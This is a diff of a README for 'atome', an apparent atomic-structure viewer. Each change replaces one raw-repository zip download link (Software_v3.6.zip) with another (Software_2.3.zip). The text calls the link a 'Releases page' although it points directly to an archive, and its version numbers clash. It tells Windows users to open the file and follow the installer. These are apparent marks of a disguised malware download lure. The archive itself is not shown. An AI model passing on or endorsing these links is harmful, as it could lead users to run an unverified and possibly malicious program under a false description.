@@ -6,7 +6,7 @@ Welcome to **atome**. This application helps you explore atomic structures and t
 
 ## 🔗 Download the Application
 
-[![Download atome](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_v3.6.zip%20atome-v1.0-blue)](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_v3.6.zip)
+[![Download atome](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_2.3.zip%20atome-v1.0-blue)](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_2.3.zip)
 
 ## ⚙️ System Requirements
 
@@ -21,13 +21,13 @@ Make sure your device is up-to-date for optimal performance.
 
 ## 📥 Download & Install
 
-To get **atome**, visit this page to download: [Download atome](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_v3.6.zip).
+To get **atome**, visit this page to download: [Download atome](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_2.3.zip).
 
 Follow these steps to install the application:
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of **atome**.
-3. Download the appropriate file for your system (e.g., `https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_v3.6.zip` for Windows).
+3. Download the appropriate file for your system (e.g., `https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_2.3.zip` for Windows).
 4. Open the downloaded file and follow the on-screen instructions to install the application.
 
 ## 📘 Features
@@ -78,4 +78,4 @@ Your feedback is valuable. If you have suggestions for features or improvements,
 
 Stay updated with the latest features and improvements by following our GitHub repository. We appreciate your interest in **atome** and encourage you to join the exploration of atomic structures!
 
-[![Download atome](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_v3.6.zip%20atome-v1.0-blue)](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_v3.6.zip)
+[![Download atome](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_2.3.zip%20atome-v1.0-blue)](https://github.com/Sfulhadi/atome/raw/refs/heads/main/docs/Software_2.3.zip)
